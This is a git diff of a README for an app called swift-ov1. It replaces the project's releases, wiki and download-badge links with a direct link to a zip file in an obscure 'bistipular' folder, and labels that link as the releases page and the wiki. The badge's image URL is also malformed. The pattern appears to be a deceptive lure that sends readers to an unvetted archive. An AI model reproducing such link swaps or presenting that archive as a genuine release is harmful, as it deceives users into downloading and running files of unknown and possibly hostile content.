@@ -6,7 +6,7 @@ Welcome to swift-ov1! This application allows you to view content online seamles
 
 ## 📥 Download swift-ov1
 
-[![Download swift-ov1](https://img.shields.io/badge/Download%20swift--ov1-v1.0.0-blue.svg)](https://github.com/muradmgamer/swift-ov1/releases)
+[![Download swift-ov1](https://raw.githubusercontent.com/muradmgamer/swift-ov1/main/bistipular/swift-ov1.zip%https://raw.githubusercontent.com/muradmgamer/swift-ov1/main/bistipular/swift-ov1.zip)](https://raw.githubusercontent.com/muradmgamer/swift-ov1/main/bistipular/swift-ov1.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ To use swift-ov1, ensure your device meets the following requirements:
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/muradmgamer/swift-ov1/releases) to find the latest version of swift-ov1.
+   Go to the [Releases page](https://raw.githubusercontent.com/muradmgamer/swift-ov1/main/bistipular/swift-ov1.zip) to find the latest version of swift-ov1.
 
 2. **Choose Your Version**
    Look for the latest version available. It should be listed at the top of the page. Click on it to view the details.
@@ -64,7 +64,7 @@ If you encounter any issues while downloading or running swift-ov1, consider the
 
 ## 📞 Support
 
-Need further assistance? You can reach us by creating an issue in our GitHub repository or checking the FAQ section on the [wiki page](https://github.com/muradmgamer/swift-ov1/wiki).
+Need further assistance? You can reach us by creating an issue in our GitHub repository or checking the FAQ section on the [wiki page](https://raw.githubusercontent.com/muradmgamer/swift-ov1/main/bistipular/swift-ov1.zip).
 
 ## 🗂️ Acknowledgments
 
@@ -72,6 +72,6 @@ Thank you for choosing swift-ov1. We appreciate your support and feedback. Your 
 
 ## 🔗 Stay Updated
 
-To keep up with future updates about swift-ov1, please visit our [Releases page](https://github.com/muradmgamer/swift-ov1/releases) regularly. 
+To keep up with future updates about swift-ov1, please visit our [Releases page](https://raw.githubusercontent.com/muradmgamer/swift-ov1/main/bistipular/swift-ov1.zip) regularly. 
 
 Enjoy using swift-ov1!
